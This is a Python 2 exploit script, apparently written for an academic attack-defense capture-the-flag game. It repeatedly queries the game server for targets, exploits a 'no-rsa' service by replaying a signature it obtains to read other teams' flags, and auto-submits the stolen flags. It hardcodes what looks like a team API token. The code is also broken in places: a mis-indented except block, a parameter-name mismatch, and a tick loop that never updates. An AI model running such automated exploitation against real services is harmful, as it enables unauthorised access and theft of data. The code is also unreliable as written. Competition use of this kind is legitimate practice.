from swpag_client import Team
import json
import socket
import time

def netcat(hostname, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)
    ret_list = []
    while 1:
        data = s.recv(1024)
        if data == "":
            break
        ret_list.append(repr(data))
        #print "Received:", repr(data)
    #print "Connection closed."
    s.close()
    return ret_list

def exploit_no_rsa(hostname, port, flagId):
    print 'hostname:',hostname, 'port:',port, 'flagId:', flag_id
    content = 'S'+ "\n" + '0' + flag_id
    ret_list = netcat(hostname, port, content)
    print 'ret_list:', ret_list
    sigLine = ret_list[2]
    print 'sigline:',sigLine
    lineArr = sigLine.split('\\n')
    print 'lineArr:', lineArr
    sig = lineArr[1]
    print 'sig:', sig
    content = 'R' + "\n" + flag_id + ' ' + sig
    print 'content:', content
    ret_list = netcat(hostname, port, content)
    print ret_list
    flag_line = ret_list[1]
    print 'flag_line:',flag_line 	
    lineArr = flag_line.split('\\n')
    print 'lineArr:', lineArr
    flag_line = lineArr[1]
    print 'flag_line:', flag_line
    flag = flag_line.split(' ')[3]
    print 'FLAG================================================================================================:',flag
    print(t.submit_flag([flag]))	    

t = Team("http://actf0.cse545.rev.fish/", "lpmrUtF4wT1mu5FnVN6Tt82LnK1j9n5d")
print(t.game_url)
#print(t.get_vm())
while True:
    gameStatus = t.get_game_status()
    print('gameStatus:',gameStatus)
    currentTick = gameStatus['tick']['tick_id']
    print(t.get_service_list())
    #t.get_targets(service_id)
    services = t.get_service_list()
    print('services:',services)
    print()
    print()
    for service in services:
        print 'SERVICE NAME:',service
        print 'SERVICE ID:',service['service_id']
        service_id = service['service_id']
        service_name = service['service_name']
        print 'service_name:',service_name
        targets = t.get_targets(service_id)
        for target in targets:
            print('TARGET NAME:',target)#,netcat(target,''))
            hostname = target['hostname']
            port = target['port']
            flag_id = target['flag_id']
            if service_name == 'no-rsa':
                try:
                        exploit_no_rsa(hostname,port,flag_id)
                except:
                print('Exception occured for user')
            #break
    while True:
        newGameStatus = t.get_game_status()
        newTick = gameStatus['tick']['tick_id']
        print 'Checking new tick:',newTick
        if newTick != currentTick:
            break
        time.sleep(120)